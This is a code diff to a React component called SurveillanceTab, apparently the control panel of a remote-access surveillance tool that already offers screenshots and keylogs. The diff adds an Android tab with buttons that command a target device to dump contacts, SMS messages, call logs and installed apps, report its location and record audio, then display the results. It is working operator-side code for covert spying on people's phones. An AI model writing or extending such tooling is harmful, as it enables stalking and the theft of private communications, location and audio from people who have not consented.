@@ -25,11 +25,23 @@ import {
   Play,
   Square,
   Loader2,
+  Phone,
+  MessageCircle,
+  MapPin,
+  Package,
+  PhoneCall,
 } from "lucide-react";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 import { dispatchCommand, waitForResult } from "@/lib/commands";
 import { toast } from "sonner";
 
-const SurveillanceTab = ({ machineId }: { machineId: string }) => {
+const SurveillanceTab = ({ machineId, clientOs }: { machineId: string; clientOs?: string | null }) => {
+  const isAndroid = clientOs?.toLowerCase().includes("android") ?? false;
   const queryClient = useQueryClient();
   const [screenshotLoading, setScreenshotLoading] = useState(false);
   const [keylogSearch, setKeylogSearch] = useState("");
@@ -139,6 +151,11 @@ const SurveillanceTab = ({ machineId }: { machineId: string }) => {
         <TabsTrigger value="keylogs" className="gap-1.5 text-xs data-[state=active]:bg-card">
           <Keyboard className="w-3.5 h-3.5" /> Keylogs
         </TabsTrigger>
+        {isAndroid && (
+          <TabsTrigger value="android" className="gap-1.5 text-xs data-[state=active]:bg-card">
+            <Phone className="w-3.5 h-3.5" /> Android
+          </TabsTrigger>
+        )}
       </TabsList>
 
       <TabsContent value="screenshots" className="mt-3 space-y-3">
@@ -317,8 +334,120 @@ const SurveillanceTab = ({ machineId }: { machineId: string }) => {
           </CardContent>
         </Card>
       </TabsContent>
+
+      {isAndroid && (
+        <TabsContent value="android" className="mt-3 space-y-3">
+          <Card className="border-border/30">
+            <CardHeader className="pb-2">
+              <CardTitle className="text-xs flex items-center gap-2 text-muted-foreground">
+                <Phone className="w-3.5 h-3.5 text-primary" /> Android Data Extraction
+              </CardTitle>
+            </CardHeader>
+            <CardContent className="grid grid-cols-2 md:grid-cols-3 gap-2">
+              <AndroidBtn
+                icon={Phone}
+                label="Dump Contacts"
+                command="contacts"
+                machineId={machineId}
+              />
+              <AndroidBtn
+                icon={MessageCircle}
+                label="Dump SMS"
+                command="sms_dump"
+                machineId={machineId}
+              />
+              <AndroidBtn
+                icon={PhoneCall}
+                label="Call Log"
+                command="calllog"
+                machineId={machineId}
+              />
+              <AndroidBtn
+                icon={Package}
+                label="Installed Apps"
+                command="apps"
+                machineId={machineId}
+              />
+              <AndroidBtn
+                icon={MapPin}
+                label="Get Location"
+                command="location"
+                machineId={machineId}
+              />
+              <AndroidBtn
+                icon={Mic}
+                label="Record Audio"
+                command="microphone"
+                machineId={machineId}
+              />
+            </CardContent>
+          </Card>
+        </TabsContent>
+      )}
     </Tabs>
   );
 };
+
+function AndroidBtn({
+  icon: Icon,
+  label,
+  command,
+  machineId,
+}: {
+  icon: React.ElementType;
+  label: string;
+  command: string;
+  machineId: string;
+}) {
+  const [loading, setLoading] = useState(false);
+  const [result, setResult] = useState<string | null>(null);
+
+  const run = async () => {
+    setLoading(true);
+    const cmdId = await dispatchCommand(machineId, command);
+    if (!cmdId) {
+      toast.error("Failed to send command");
+      setLoading(false);
+      return;
+    }
+    toast.success(`${label} requested`);
+    const res = await waitForResult(cmdId, 30000);
+    if (res?.result) {
+      setResult(res.result);
+    } else if (res?.status === "timeout") {
+      toast.error(`${label} timed out`);
+    } else {
+      toast.error(`${label} failed`);
+    }
+    setLoading(false);
+  };
+
+  return (
+    <>
+      <Button
+        variant="outline"
+        size="sm"
+        className="gap-1.5 h-9 text-xs justify-start"
+        onClick={run}
+        disabled={loading}
+      >
+        {loading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Icon className="w-3.5 h-3.5" />}
+        {label}
+      </Button>
+      {result && (
+        <Dialog open={!!result} onOpenChange={(open) => !open && setResult(null)}>
+          <DialogContent className="sm:max-w-2xl max-h-[80vh]">
+            <DialogHeader>
+              <DialogTitle>{label}</DialogTitle>
+            </DialogHeader>
+            <div className="bg-[hsl(222,47%,4%)] rounded-lg p-4 font-mono text-xs max-h-[60vh] overflow-auto">
+              <pre className="text-gray-300 whitespace-pre-wrap">{result}</pre>
+            </div>
+          </DialogContent>
+        </Dialog>
+      )}
+    </>
+  );
+}
 
 export default SurveillanceTab;
